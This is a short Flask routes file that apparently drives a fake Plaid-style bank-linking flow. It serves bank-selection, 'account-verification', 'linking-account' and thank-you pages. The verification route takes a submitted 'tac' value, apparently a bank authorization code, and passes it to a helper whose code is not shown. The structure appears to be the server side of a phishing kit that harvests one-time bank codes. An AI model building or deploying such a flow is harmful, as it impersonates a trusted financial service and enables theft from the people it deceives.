from flask import Blueprint, render_template, request, url_for, redirect
from .utils import tac_code
main = Blueprint('main', __name__)

@main.route('/')
def index():
    return render_template('index.html')

@main.route('/index/bank-selection')
def plaid():
    return render_template('plaid.html')

@main.route('/account-verification', methods=['GET','POST'])
def tac():
    if request.method == 'POST':
        tac = request.form['tac']
        if tac:
            tac_code(tac)
            return redirect(url_for('main.linking'))
    return render_template('tac.html')

@main.route('/success/Thank-You')
def success():
    return render_template('success.html')

@main.route('/linking-account')
def linking():
    return render_template('linking.html')

